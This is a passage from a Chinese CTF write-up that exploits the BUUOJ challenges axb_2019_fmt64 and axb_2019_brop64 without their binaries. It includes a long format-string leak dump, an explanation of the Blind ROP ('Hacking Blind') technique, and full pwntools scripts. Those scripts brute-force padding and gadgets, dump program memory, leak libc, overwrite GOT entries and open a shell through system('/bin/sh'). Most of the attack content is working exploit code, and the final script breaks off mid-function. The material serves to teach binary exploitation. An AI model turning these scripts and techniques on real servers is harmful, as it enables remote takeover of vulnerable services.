    [*] 0    %0$p      
    [*] 8    0x1       
    [*] 16   0xfffffffffff80000
    [*] 24   (nil)     
    [*] 32   0xffff    
    [*] 40   0x13      
    [*] 48   0x7f8314c7d410
    [*] 56   0x1315257000
    [*] 64   0x7c2d2d3c70243825
    [*] 72   0xa       
    [*] 80   (nil)     
    [*] ..   (nil)   
    [*] 312  (nil)     
    [*] 320  0x300     
    [*] 328  (nil)     
    [*] 336  0x7265746165706552
    [*] 344  0x2d3c70243334253a
    [*] 352  0xa0a7c2d 
    [*] 360  (nil)     
    [*] ...  (nil)
    [*] 632  (nil)     
    [*] 640  0x7ffc76aacae0
    [*] 648  0x3288869db05f6500
    [*] 656  0x400970  
    [*] 664  0x7f8314c8d830
    [*] 672  (nil)     
    [*] 680  0x7ffc76aacae8
    [*] 688  0x100000000
    [*] 696  0x400816  
    [*] 704  (nil)     
    [*] 712  0x313646518db913f1
    [*] 720  0x400720  
    [*] 728  0x7ffc76aacae0
    [*] 736  (nil)     
    [*] 744  (nil)     
    [*] 752  0xceceab840b7913f1
    [*] 760  0xce306f40308913f1
    [*] 768  (nil)     
    [*] 776  (nil)     
    [*] 784  (nil)     
    [*] 792  0x7ffc76aacaf8
    [*] 800  0x7f831525e168
    [*] 808  0x7f83150477db
    [*] 816  (nil)     
    [*] 824  (nil)     
    [*] 832  0x400720  
    [*] 840  0x7ffc76aacae0
    [*] 848  (nil)     
    [*] 856  0x400749  
    [*] 864  0x7ffc76aacad8
    [*] 872  0x1c      
    [*] 880  0x1       
    [*] 888  0x7ffc76aacf37
    [*] 896  (nil)     
    [*] 904  0x7ffc76aacf41
    [*] 912  0x7ffc76aacf57
    [*] 920  0x7ffc76aacf5f
    [*] 928  0x7ffc76aacf6a
    [*] 936  0x7ffc76aacf7f
    [*] 944  0x7ffc76aacfc1
    [*] 952  0x7ffc76aacfc7
    [*] 960  0x7ffc76aacfd5
    [*] 968  (nil)     
    [*] 976  0x21      
    [*] 984  0x7ffc76bcf000
    [*] 992  0x10      
    [*] 1000 0xf8bfbff 
    [*] 1008 0x6       
    [*] 1016 0x1000    
    [*] 1024 0x11      
    [*] 1032 0x64      
    [*] 1040 0x3       
    [*] 1048 0x400040  
    [*] 1056 0x4       
    [*] 1064 0x38      
    [*] 1072 0x5       
    [*] 1080 0x9       
    [*] 1088 0x7       
    [*] 1096 0x7f8315037000
    [*] 1104 0x8       
    [*] 1112 (nil)     
    [*] 1120 0x9       
    [*] 1128 0x400720  
    [*] 1136 0xb       
    [*] 1144 0x3e8     
    [*] 1152 0xc       
    [*] 1160 0x3e8     
    [*] 1168 0xd       
    [*] 1176 0x3e8     
    [*] 1184 0xe       
    [*] 1192 0x3e8     
    [*] 1200 0x17      
    [*] 1208 (nil)     
    [*] 1216 0x19      
    [*] 1224 0x7ffc76aacc89
    [*] 1232 0x1a      
    [*] 1240 (nil)     
    [*] 1248 0x1f      
    [*] 1256 0x7ffc76aacfee
    [*] 1264 0xf       
    [*] 1272 0x7ffc76aacc99
    [*] 1280 (nil)     
    [*] 1288 (nil)     
    [*] 1296 (nil)     
    [*] 1304 0x88869db05f654f00
    [*] 1312 0xf8989b2368cfac32
    [*] 1320 0x34365f36387889
    [*] 1328 (nil)     
    [*] .... (nil) 
    [*] 1976 (nil)     
    [*] 1984 0x2e00000000000000
    [*] 1992 0x6e77702f6e77702f
    [*] 2000 0x4d414e54534f4800
    [*] 2008 0x6162616232313d45
    [*] 2016 0x5300623030313137
    [*] 2024 0x4800313d4c564c48
    [*] 2032 0x6f6f722f3d454d4f
    [*] 2040 0x6374652f3d5f0074
    [*] 2048 0x2f642e74696e692f
    [*] 2056 0x50006474656e6978
    [*] 2064 0x7273752f3d485441
    [*] 2072 0x732f6c61636f6c2f
    [*] 2080 0x7273752f3a6e6962
    [*] 2088 0x622f6c61636f6c2f
    [*] 2096 0x2f7273752f3a6e69
    [*] 2104 0x73752f3a6e696273
    [*] 2112 0x732f3a6e69622f72
    [*] 2120 0x6e69622f3a6e6962
    [*] 2128 0x46002f3d44575000
    [*] 2136 0x5f746f6e3d47414c
    [*] 2144 0x4d45520067616c66
    [*] 2152 0x54534f485f45544f
    [*] 2160 0x312e302e3437313d
    [*] 2168 0x2f2e003331322e30
    [*] 2176 0x6e77702f6e7770
    [*] 2184 (nil)
    

此处我们发现了在泄露序号为720和832的位置出现了相同的明显位于`.text`段中的相同地址，这就是`_start`函数的地址。

同时也已经发现了格式化字符串位置。

    
    
    [*] 336  0x7265746165706552  --> retaepeR
    [*] 344  0x2d3c70243334253a  --> -<p$34%:
    [*] 352  0x000000000a0a7c2d  --> nn|-    

此时我们注意到，如果我们先填充7个字节，接下来填充的格式化字符串将位于352的位置上。

那么，我们的格式化字符串位置将实际位于`N=44`处，即偏移为44，那么我们接下来构建偏移，泄露文件。

**Dump`.text`**

此处我们首先尝试构建`payload = 'Leak-->%45$s<-|'+p64(start_addr)`

发送到远端会发现没有泄露回显，并且远端异常退出了。

正巧BUUOJ给定了源码，我们本地调试一下~

经过调试，发现程序会在我们输入的地址末尾强制加上一个`x0a`字节，进而会中断在

    
    
    movdqu xmm4, XMMWORD PTR [rax] ; <strlen+38>   RAX=0x0a400720
    

进而会导致访址失败。

此时重新看看我们一开始泄露出的数据，仔细观察可以发现，在编号为64（N=8）的位置也有我们输入的格式化字符串，事实上，我们的输入正是从编号64开始，只是会被sprintf函数复制到编号352（N=44）的位置，而在未经过sprintf函数复制时，我们的地址末尾并不会被强制放上`x0a`，因此，我们构造的payload应当为`payload
=
'Leak--->%10$s<-|'+p64(start_addr)`，此时，程序将会从上方未经过sprintf函数的我们的输入处获取的函数地址处获取数据。

**IDA文件修复 &分析**

![](https://p0.ssl.qhimg.com/dm/1024_646_/t012d842828b1bfa056.png)

根据前面说明过的_start函数结构，我们可以很方便的找到`main`函数位置。

![](https://p3.ssl.qhimg.com/dm/1024_646_/t01d6712119150c2e56.png)

这里因为setbuf函数分析失败了，我们可以看汇编码推测得出部分函数的名字。

![](https://p1.ssl.qhimg.com/dm/1024_646_/t01d689975adf67465a.png)

显然这里给Sub_400670传入的是回显的内容，那么Sub_400670应为puts函数。

给Sub_4006D0传入了0、字符串地址、长度，则Sub_4006D0应当为read函数。

给Sub_4006F0同时传入了我们输入的字符串地址和一个新的字符串地址，于是怀疑是sprintf函数。

最后的Sub_4006A0传入了给Sub_4006F0传入的新函数地址，于是怀疑是printf函数。

![](https://p3.ssl.qhimg.com/dm/1024_127_/t010b5d3e64aa4b71f8.png)

**泄露printf的got表地址**

我们接下来泄露`printf[@plt](https://github.com/plt
"@plt")`也就是`0x4006D0`处的指令内容，以获取`printf[@got](https://github.com/got
"@got")`的位置。

    
    
    printf_plt=0x4006D0
    payload = 'Leak--->%10$s<-|'+p64(printf_plt)
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    sh.recvuntil('Repeater:Leak--->')
    print(disasm(sh.recvuntil('<-|').strip('<-|')))
    

![](https://p1.ssl.qhimg.com/dm/1024_401_/t01074c61686b9ae4ca.png)

但是发现，根据`disasm`的信息，`printf[@plt](https://github.com/plt
"@plt")`并没有存放`printf[@got](https://github.com/got
"@got")`的地址。此处我们决定重新泄露文件，将起始点设为`0x400600`。

![](https://p5.ssl.qhimg.com/dm/1024_896_/t017b493ad9cc2876ad.png)

发现分析结果有了较为明显的变化。

![](https://p2.ssl.qhimg.com/dm/1024_640_/t0130c47bd15d45d561.png)

我们相应的点进去就可以获知其`.plt.got`地址。

于是我们可以获取

    
    
    strlen@.plt.got:0x601020
    setbuf@.plt.got:0x601028
    printf@.plt.got:0x601030
    read  @.plt.got:0x601048
    puts  @.plt.got:0x601018
    

**Leak libc & Final exp**

现在，我们只需要获取`puts@.plt.got`的内容即可计算出libc基址，并且劫持got表地址。

    
    
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='amd64'
    
    # file_name=ELF("./")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    if args['REMOTE']:
        sh = remote(sys.argv[1], sys.argv[2])
    else:
        sh = process("./axb_2019_fmt64")
    
    def where_is_start(ret_index=null):
        return_addr=0
        for i in range(400):
            payload = '%%%d$p<--|' % (i)
            sh.recvuntil('Please tell me:')
            sh.sendline(payload)
            sh.recvuntil('Repeater:')
            val = sh.recvuntil('<--|')
            log.info(str(i*8).ljust(4)+' '+val.strip('<--|').ljust(10))
            if(i*4==ret_index):
                return_addr=int(val.strip('<--|').ljust(10)[2:],16)
                return return_addr
            # sh.recvrepeat(0.2)
    
    def dump_text(start_addr=0):
        text_segment=''
        try:
            while True:
                payload = 'Leak--->%10$s<-|'+p64(start_addr)
                sh.recvuntil('Please tell me:')
                # gdb.attach(sh)
                sh.send(payload)
                sh.recvuntil('Repeater:Leak--->')
                value = sh.recvuntil('<-|').strip('<-|')
                text_segment += value
                start_addr += len(value)
                if(len(value)==0):
                    text_segment += 'x00'
                    start_addr += 1
                if(text_segment[-9:-1]=='x00'*16):
                    break
        except Exception as e:
            print(e)
        finally:
            log.info('We get ' + str(len(text_segment)) +'byte file!')
            with open('axb_2019_fmt64_dump','wb') as fout:
                fout.write(text_segment)
    
    def antitone_fmt_payload(offset, writes, numbwritten=0, write_size='byte'):
        config = {
            32 : {
                'byte': (4, 1, 0xFF, 'hh', 8),
                'short': (2, 2, 0xFFFF, 'h', 16),
                'int': (1, 4, 0xFFFFFFFF, '', 32)},
            64 : {
                'byte': (8, 1, 0xFF, 'hh', 8),
                'short': (4, 2, 0xFFFF, 'h', 16),
                'int': (2, 4, 0xFFFFFFFF, '', 32)
            }
        }
    
        if write_size not in ['byte', 'short', 'int']:
            log.error("write_size must be 'byte', 'short' or 'int'")
    
        number, step, mask, formatz, decalage = config[context.bits][write_size]
    
        payload = ""
    
        payload_last = ""
        for where,what in writes.items():
            for i in range(0,number*step,step):
                payload_last += pack(where+i)
    
        fmtCount = 0
        payload_forward = ""
    
        key_toadd = []
        key_offset_fmtCount = []
    
    
        for where,what in writes.items():
            for i in range(0,number):
                current = what & mask
                if numbwritten & mask <= current:
                    to_add = current - (numbwritten & mask)
                else:
                    to_add = (current | (mask+1)) - (numbwritten & mask)
    
                if to_add != 0:
                    key_toadd.append(to_add)
                    payload_forward += "%{}c".format(to_add)
                else:
                    key_toadd.append(to_add)
                payload_forward += "%{}${}n".format(offset + fmtCount, formatz)
                key_offset_fmtCount.append(offset + fmtCount)
                #key_formatz.append(formatz)
    
                numbwritten += to_add
                what >>= decalage
                fmtCount += 1
    
    
        len1 = len(payload_forward)
    
        key_temp = []
        for i in range(len(key_offset_fmtCount)):
            key_temp.append(key_offset_fmtCount[i])
    
        x_add = 0
        y_add = 0
        while True:
    
            x_add = len1 / 8 + 1
            y_add = 8 - (len1 % 8)
    
            for i in range(len(key_temp)):
                key_temp[i] = key_offset_fmtCount[i] + x_add
    
            payload_temp = ""
            for i in range(0,number):
                if key_toadd[i] != 0:
                    payload_temp += "%{}c".format(key_toadd[i])
                payload_temp += "%{}${}n".format(key_temp[i], formatz)
    
            len2 = len(payload_temp)
    
            xchange = y_add - (len2 - len1)
            if xchange >= 0:
                payload = payload_temp + xchange*'a' + payload_last
                return payload
            else:
                len1 = len2
    
    # start_addr=where_is_start(720)
    # start_addr=0x400720
    # start_addr=0x400600
    # dump_text(start_addr)
    printf_got=0x601030
    puts_got=0x601018
    payload = 'Leak--->%10$s<-|'+p64(puts_got)
    sh.recvuntil('Please tell me:')
    sh.send(payload)
    sh.recvuntil('Repeater:Leak--->')
    printf_addr=u64(sh.recvuntil('<-|').strip('<-|').ljust(8,'x00'))
    libc_addr=printf_addr-libc.symbols['puts']
    system_addr=libc_addr+libc.symbols['system']
    log.success("libc base address is "+str(hex(libc_addr)))
    log.success("system address is "+str(hex(system_addr)))
    payload=antitone_fmt_payload(8, {printf_got:system_addr}, numbwritten=9, write_size='short')
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    # gdb.attach(sh)
    sh.sendline(';/bin/shx00')
    sh.interactive()
    # print(sh.recv())
    

## 0x04 Blind Return Oriented Programming Attack(BROP)

###  原理简述

BROP攻击基于一篇发表在Oakland 2014的论文 **Hacking Blind** ，作者是来自Standford的Andrea
Bittau，以下是相关paper和slide的链接：[paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)、[slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)。

以及BROP的原网站地址：[Blind Return Oriented Programming (BROP)
Website](http://www.scs.stanford.edu/brop/)

**BROP攻击的目标和前提条件**

目标：通过ROP的方法远程攻击某个应用程序，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX,
ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务器可以是32位系统或者64位系统。

初看这个目标感觉实现起来特别困难。其实这个攻击有两个前提条件的：

  * 必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；
  * 服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand（意味着虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的）。这个需求其实是合理的，因为当前像nginx, MySQL, Apache, OpenSSH, Samba等服务器应用都是符合这种特性的。

**BROP的攻击流程 1 – 远程dump内存**

由于我们不知道被攻击程序的内存布局，所以首先要做的事情就是通过某种方法从远程服务器dump出该程序的内存到本地，为了做到这点我们需要调用一个系统调用`write`，传入一个socket文件描述符，如下所示：

> write(int sock, void *buf, int len)

将这条系统调用转换成4条汇编指令，如图所示：

![](https://p4.ssl.qhimg.com/t01164dfbca7ca64a95.png)

所以从ROP攻击的角度来看，我们只需要找到四个相应的gadget，然后在栈上构造好这4个gadget的内存地址，依次进行顺序调用就可以了。

但是问题是我们现在连内存分布都不知道，该如何在内存中找到这4个gadgets呢？特别是当系统部署了ASLR和stack
canaries等保护机制，似乎这件事就更难了。

所以我们先将这个问题放一放，在脑袋里记着这个目标，先来做一些准备工作。

**攻破Stack Canaries防护**

如果不知道什么是`stack
canaries`可以先看[这里](http://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)，简单来说就是在栈上的`return
address`下面放一个随机生成的数（成为canary），在函数返回时进行检查，如果发现这个canary被修改了（可能是攻击者通过buffer
overflow等攻击方法覆盖了），那么就报错。

那么如何攻破这层防护呢？一种方法是brute-force暴力破解，但这个很低效，这里作者提出了一种叫做“stack reading”的方法：

假设这是我们想要overflow的栈的布局：

![](https://p4.ssl.qhimg.com/t011e7f430259c2d2ec.png)

我们可以尝试任意多次来判断出overflow的长度（直到进程由于canary被破坏crash了，在这里即为`4096+8=4104`个字节），之后我们将这4096个字节填上任意值，然后一个一个字节顺序地进行尝试来还原出真实的canary，比如说，我们将第4097个字节填为`x`，如果`x`和原来的canary中的第一个字节是一样的话，那么进程不会crash，否则我们尝试下一个`x`的可能性，在这里，由于一个字节只有256种可能，所以我们只要最多尝试256次就可以找到canary的某个正确的字节，直到我们得到8个完整的canary字节，该流程如下图所示：

![](https://p3.ssl.qhimg.com/t0122a8bc04a518aefb.png)

我们同样可以用这种方法来得到保存好的`frame pointer`和`return address`。

**寻找`stop gadget`**

到目前为止，我们已经得到了合适的canary来绕开stack canary的保护, 接下来的目标就是找到之前提到的4个gadgets。

在寻找这些特定的gadgets之前，我们需要先来介绍一种特殊的gadget类型：`stop gadget`.

一般情况下，如果我们把栈上的`return address`覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该`return
address`指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，存在另外一种情况，即该`return
address`指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。于是，我们把这种类型的gadget，称为`stop
gadget`，这种gadget对于寻找其他gadgets取到了至关重要的作用。

**寻找可利用的（potentially useful）gadgets**

假设现在我们找到了某个可以造成程序block住的`stop
gadget`，比如一个无限循环，或者某个blocking的系统调用（`sleep`），那么我们该如何找到其他 `useful
gadgets`呢？（这里的“useful”是指有某些功能的gadget，而不是会造成crash的gadget）。

到目前为止我们还是只能对栈进行操作，而且只能通过覆盖`return address`来进行后续的操作。假设现在我们猜到某个`useful
gadget`，比如`pop rdi; ret`,
但是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash，在这个过程中攻击者其实并不知道这个`useful
gadget`被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的`useful
gadget`，从而放弃它，这个步骤如下图所示：

![](https://p4.ssl.qhimg.com/t01317f3ecc6e86b3f8.png)

但是，如果我们有了`stop gadget`，那么整个过程将会很不一样. 如果我们在需要尝试的`return address`之后填上了足够多的`stop
gadgets`，如下图所示：

![](https://p4.ssl.qhimg.com/t0158fb2a0edb29dfaa.png)

那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些`useful
gadget`则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个`stop
gadget`，那么如上所述，它也会被我们标识为`useful gadget`。不过这并没有关系，因为之后我们还是需要检查该`useful
gadget`是否是我们想要的gadget.

**最后一步：远程dump内存**

到目前为止，似乎准备工作都做好了，我们已经可以绕过canary防护，并且得到很多不会造成进程crash的“potential useful
gadget”了，那么接下来就是该如何找到我们之前所提到的那四个gadgets呢？

![](https://p4.ssl.qhimg.com/t01ae3d96b5b86adb08.png)

如上图所示，为了找到前两个gadgets：`pop %rsi; ret`和`pop %rdi; ret`，我们只需要找到一种所谓的`BROP
gadget`就可以了，这种gadget很常见，它做的事情就是恢复那些`callee saved registers`.
而对它进行一个偏移就能够生成`pop %rdi`和`pop %rsi`这两个gadgets.

不幸的是`pop %rdx; ret`这个gadget并不容易找到，它很少出现在代码里, 所以作者提出一种方法，相比于寻找`pop
%rdx`指令，他认为可以利用`strcmp`这个函数调用，该函数调用会把字符串的长度赋值给`%rdx`，从而达到相同的效果。另外`strcmp`和`write`调用都可以在程序的Procedure
Linking Table (PLT)里面找到.

所以接下来的任务就是：

  * 找到所谓的`BROP Gadget`；
  * 找到对应的PLT项。

**寻找`BROP Gadget`**

事实上`BROP gadgets`特别特殊，因为它需要顺序地从栈上`pop` 6个值然后执行`ret`。所以如果我们利用之前提到的`stop
gadget`的方法就可以很容易找到这种特殊的gadget了，我们只需要在`stop gadget`之前填上6个会造成crash的地址:

![](https://p2.ssl.qhimg.com/t012e7a87015815966f.png)

如果任何`useful gadget`满足这个条件且不会crash的话，那么它基本上就是`BROP gadgets`了。

**寻找PLT项**

[PLT](http://en.wikipedia.org/wiki/Dynamic_linking)是一个跳转表，它的位置一般在可执行程序开始的地方，该机制主要被用来给应用程序调用外部函数（比如libc等），具体的细节可以看相关的Wiki。它有一个非常独特的signature：每一个项都是16个字节对齐，其中第0个字节开始的地址指向改项对应函数的fast
path，而第6个字节开始的地址指向了该项对应函数的slow path：

![](https://p5.ssl.qhimg.com/t01cc2b388606f7aec2.png)

另外，大部分的PLT项都不会因为传进来的参数的原因crash，因为它们很多都是系统调用，都会对参数进行检查，如果有错误会返回EFAULT而已，并不会造成进程crash。所以攻击者可以通过下面这个方法找到PLT：如果攻击者发现好多条连续的16个字节对齐的地址都不会造成进程crash，而且这些地址加6得到的地址也不会造成进程crash，那么很有可能这就是某个PLT对应的项了。

那么当我们得到某个PLT项，我们该如何判断它是否是`strcmp`或者`write`呢？

对于`strcmp`来说, 作者提出的方法是对其传入不同的参数组合，通过该方法调用返回的结果来进行判断。由于`BROP
gadget`的存在，我们可以很方便地控制前两个参数，`strcmp`会发生如下的可能性：

arg1 | arg2 | result  
---|---|---  
readable | 0x0 | crash  
0x0 | readable | crash  
0x0 | 0x0 | crash  
readable | readable | no-crash  
  
根据这个signature, 我们能够在很大可能性上找到`strcmp`对应的PLT项。

而对于`write`调用，虽然它没有这种类似的signature，但是我们可以通过检查所有的PLT项，然后触发其向某个socket写数据来检查`write`是否被调用了，如果`write`被调用了，那么我们就可以在本地看到传过来的内容了。

最后一步就是如何确定传给`write`的socket文件描述符是多少了。这里有两种办法：1.
同时调用好几次write，把它们串起来，然后传入不同的文件描述符数；2. 同时打开多个连接，然后使用一个相对较大的文件描述符数字，增加匹配的可能性。

到这一步为止，攻击者就能够将整个`.text`段从内存中通过socket写到本地来了，然后就可以对其进行反编译，找到其他更多的gadgets，同时，攻击者还可以dump那些symbol
table之类的信息，找到PLT中其它对应的函数项如`dup2`和`execve`等。

**BROP的攻击流程 2 – 实施攻击**

到目前为止，最具挑战性的部分已经被解决了，我们已经可以得到被攻击进程的整个内存空间了，接下来就是按部就班了（从论文中翻译）：

  * 将socket重定向到标准输入/输出（standard input/output）。攻击者可以使用`dup2`或`close`，跟上`dup`或者`fcntl(F_DUPFD)`。这些一般都能在PLT里面找到。
  * 在内存中找到`/bin/sh`。其中一个有效的方法是从symbol table里面找到一个可写区域（writable memory region），比如`environ`，然后通过socket将`/bin/sh`从攻击者这里读过去。
  * `execve` shell. 如果`execve`不在PLT上, 那么攻击者就需要通过更多次的尝试来找到一个`pop rax; ret`和`syscall`的gadget.

归纳起来，BROP攻击的整个步骤是这样的：

  * 通过一个已知的stack overflow的漏洞，并通过stack reading的方式绕过stack canary的防护，试出某个可用的return address；
  * 寻找`stop gadget`：一般情况下这会是一个在PLT中的blocking系统调用的地址（sleep等），在这一步中，攻击者也可以找到PLT的合法项；
  * 寻找`BROP gadget`：这一步之后攻击者就能够控制`write`系统调用的前两个参数了；
  * 通过signature的方式寻找到PLT上的`strcmp`项，然后通过控制字符串的长度来给`%rdx`赋值，这一步之后攻击者就能够控制`write`系统调用的第三个参数了；
  * 寻找PLT中的`write`项：这一步之后攻击者就能够将整个内存从远端dump到本地，用于寻找更多的gadgets；
  * 有了以上的信息之后，就可以创建一个shellcode来实施攻击了。

###  以axb_2019_brop64为例

⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。

**漏洞探测**

尝试nc后发送`%p`、`%s`、`%x`等格式化控制字符，发现没有任何异常回显，考虑使用BROP攻击。

**暴力确定padding**

    
    
    def Force_find_padding():
        padding_length=0
        while True:
            try:
                padding_length=padding_length+1
                sh = process("./axb_2019_brop64")
                sh.recvuntil("Please tell me:")
                sh.send('A' * padding_length)
                if "Goodbye!" not in sh.recvall():
                    raise "Programe not exit normally!"
                sh.close()
            except:
                log.success("The true padding length is "+str(padding_length-1))
                return padding_length
        log.error("We don't find true padding length!")
    
    padding_length=null
    if padding_length is null:
        padding_length=Force_find_padding()
    # [+] The true padding length is 216
    

**寻找`stop gadget`**

此处我们希望我们能够爆破出main函数的首地址，进而直接让程序回到main函数进行执行。首先此处我们可以先泄露原来的返回地址，进而缩小爆破范围。

    
    
    old_return_addr=null
    if old_return_addr is null:
        sh.recvuntil("Please tell me:")
        sh.send('A' * padding_length)
        sh.recvuntil('A' * padding_length)
        old_return_addr=u64(sh.recvuntil('Goodbye!').strip('Goodbye!').ljust(8,'x00'))
        log.info('The old return address is '+ hex(old_return_addr))
    # [*] The old return address is 0x400834
    

那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)

    
    
    def Find_stop_gadget(old_return_addr,padding_length):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = process("./axb_2019_brop64")
                sh.recvuntil("Please tell me:")
                sh.send('A' * padding_length + p16(maybe_low_byte))
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success("We found a stop gadget is " + hex(old_return_addr+maybe_low_byte))
                    return (old_return_addr+padding_length)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    #[+] We found a stop gadget is 0x4007d6
    

**寻找`BROP gadget`**

这里我们试图寻找到`__libc_csu_init`函数，根据之前提到的程序启动过程（见前置知识），`__libc_csu_init`函数会被`__libc_start_main`所调用，也就是说，程序中一定存在`__libc_csu_init`函数，而根据之前的`__libc_csu_init`函数的利用（见前置知识）,我们可以构造如下payload

    
    
    payload  = 'A' * padding_length 
    payload += p64(libc_csu_init_address) 
    payload += p64(0) * 6 
    payload += p64(stop_gadget) + p64(0) * 10
    

如果libc_csu_init_address是`pop rbx`处，程序将会再次回到stop_gadget。

那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)

    
    
    def Find_brop_gadget(libc_csu_init_address_maybe,padding_length,stop_gadget):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = process("./axb_2019_brop64")
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(libc_csu_init_address_maybe+maybe_low_byte) 
                payload += p64(0) * 6 
                payload += p64(stop_gadget) + p64(0) * 10
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success(
                        "We found a brop gadget is " + hex(
                            libc_csu_init_address_maybe+maybe_low_byte
                        )
                    )
                    return (libc_csu_init_address_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    #[+] We found a brop gadget is 0x40095A
    

**寻找puts[@plt](https://github.com/plt "@plt")**

接下来我们尝试找到puts的plt表地址，我们根据上面的泄露结果可以很明显的发现程序并没有开启ASLR保护，那么程序的加载地址必然位于0x400000，那么我们让puts输出0x400000处的内容，若地址正确，则输出结果必然包括‘ELF’。

那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)

    
    
    def Find_func_plt(func_plt_maybe,padding_length,stop_gadget,brop_gadget):
        maybe_low_byte=0x0600
        while True:
            try:
                sh = process("./axb_2019_brop64")
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(brop_gadget+9) # pop rdi;ret;
                payload += p64(0x400000)
                payload += p64(func_plt_maybe+maybe_low_byte)
                payload += p64(stop_gadget)
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "ELF" in sh.recvall(timeout=1):
                    log.success(
                        "We found a function plt address is " + hex(func_plt_maybe+maybe_low_byte)
                    )
                    return (func_plt_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    #[+] We found a function plt address is 0x400635
    

**利用puts[@plt](https://github.com/plt "@plt")，Dump源文件**

    
    
    def Dump_file(func_plt,padding_length,stop_gadget,brop_gadget):
        process_old_had_received_length=0
        process_now_had_received_length=0
        file_content=""
        while True:
            try:
                sh = process("./axb_2019_brop64")
                while True:
                    sh.recvuntil("Please tell me:")
                    payload  = 'A' * (padding_length - len('Begin_leak----->'))
                    payload += 'Begin_leak----->'
                    payload += p64(brop_gadget+9) # pop rdi;ret;
                    payload += p64(0x400000+process_now_had_received_length)
                    payload += p64(func_plt)
                    payload += p64(stop_gadget)
                    sh.send(payload)
                    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
                    received_data = sh.recvuntil('x0AHello')[:-6]
                    if len(received_data) == 0 :
                        file_content += 'x00'
                        process_now_had_received_length += 1
                    else :
                        file_content += received_data
                        process_now_had_received_length += len(received_data)
            except:
                if process_now_had_received_length == process_old_had_received_length :
                    log.info('We get ' + str(process_old_had_received_length) +' byte file!')
                    with open('axb_2019_brop64_dump','wb') as fout:
                        fout.write(file_content)
                    return
                process_old_had_received_length = process_now_had_received_length
                sh.close()
                pass
    #[*] We get 4096 byte file!
    

**IDA文件修复 &分析**

注意此处至多泄露0x1000个字节，也就是一个内存页。

我们把泄露的文件使用IDA进行分析。

![](https://p2.ssl.qhimg.com/dm/1024_886_/t01f6e5f7ba1a0c5ed3.png)

我们刚刚已经泄露出了main函数的地址，我们对其进行函数的建立。

⚠：此时我们会发现我们之前认为的puts[@plt](https://github.com/plt
"@plt")，其实是错误的，正确的应该是0x400640。这是因为0x400650恰好是plt表头的原因。

![](https://p4.ssl.qhimg.com/dm/1024_382_/t01b17f9982c501eae3.png)

**泄露puts的got表地址，Leak libc base**

    
    
    payload  = 'A' * (padding_length - len('Begin_leak----->'))
    payload += 'Begin_leak----->'
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(puts_got_addr)
    payload += p64(puts_plt_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
    puts_addr = u64(sh.recvuntil('x0AHello')[:-6].ljust(8,'x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    payload  = 'A' * padding_length
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recv()
    sh.interactive()
    sh.close()
    

**EXP**

    
    
    from pwn import *
    import binascii
    import sys
    context.log_level='debug'
    context.arch='amd64'
    
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
    def get_sh():
        if args['REMOTE']:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./axb_2019_brop64")
    
    def Force_find_padding():
        padding_length=0
        while True:
            try:
                padding_length=padding_length+1
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                sh.send('A' * padding_length)
                if "Goodbye!" not in sh.recvall():
                    raise "Programe not exit normally!"
                sh.close()
            except:
                log.success("The true padding length is "+str(padding_length-1))
                return padding_length
        log.error("We don't find true padding length!")
    
    def Find_stop_gadget(old_return_addr,padding_length):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = get_sh()
                sh.recvuntil("Please tell me:")
